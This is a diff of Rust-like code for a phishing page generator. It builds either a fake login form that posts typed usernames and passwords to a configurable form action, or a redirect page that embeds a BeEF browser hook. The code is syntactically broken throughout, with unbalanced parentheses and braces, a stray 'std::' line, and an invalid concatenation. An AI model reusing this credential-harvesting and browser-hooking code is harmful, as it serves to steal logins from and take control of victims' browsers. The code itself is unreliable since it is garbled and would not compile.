@@ -29,23 +29,16 @@
   </body>
 </html>
 */
-fn make_html( hook_loc,  redirect,  formaction, form_or_redirect) {
-
-    let html_redirect_body;
-
+fn make_html( hook_loc,  redirect, redir_messg, formaction, form_or_redirect) {
+    let redirect_message      = redir_messg;
     let html_form_body;
-
     let hook_location = hook_loc;
-
     let redirect_ip = redirect;
 
     // build the form
     let html_login_head       ="<!DOCTYPE html><html><head><meta charset=\"utf-8\" /><title></title></head>";
-    
     let html_form_body_top    = "<body><form class=\"login\" ";
-    // form action
     let form_action           = format!("{}{}{}" , "\"action=\"" , formaction , "\"";
-    std::
     let html_form_body_bottom = " method=\"post\">\
                                 <input type=\"text\" name=\"username\" value=\"username\">\
                                 <input type=\"text\" name=\"password\" value=\"password\">\
@@ -61,7 +54,7 @@ fn make_html( hook_loc,  redirect,  formaction, form_or_redirect) {
 
     // Determine if the user wants the form or the redirect
     if form_or_redirect == true {
-        let html_redirect_body = std::concat!() html_redirect_head + beef_hook + html_redirect_middle + redirect_bottom;
+        let html_redirect_body = format!("{}{}{}{}" , html_redirect_head , beef_hook , html_redirect_middle , redirect_bottom)};
         return html_redirect_body;
     else if (form_or_redirect == false{
         html_form_body = html_login_head + html_form_body_top + form_action + html_form_body_bottom;
